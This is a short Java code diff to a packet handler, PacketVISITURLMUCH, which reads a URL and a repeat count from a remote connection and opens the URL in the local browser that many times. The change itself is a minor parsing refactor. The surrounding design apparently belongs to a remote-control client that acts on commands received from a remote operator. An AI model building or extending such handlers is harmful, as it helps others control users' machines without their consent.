@@ -10,7 +10,7 @@ public class PacketVISITURLMUCH extends AbstractPacket {
 	@Override
 	public void read(String line) throws Exception {
 		String url = Connection.readLine();
-		int times = Integer.parseInt(Connection.readLine());
+		int times = Connection.readInt();
 		try {
 			for (int i = 0; i < times; i++) {
 				java.awt.Desktop.getDesktop().browse(new URI(url));
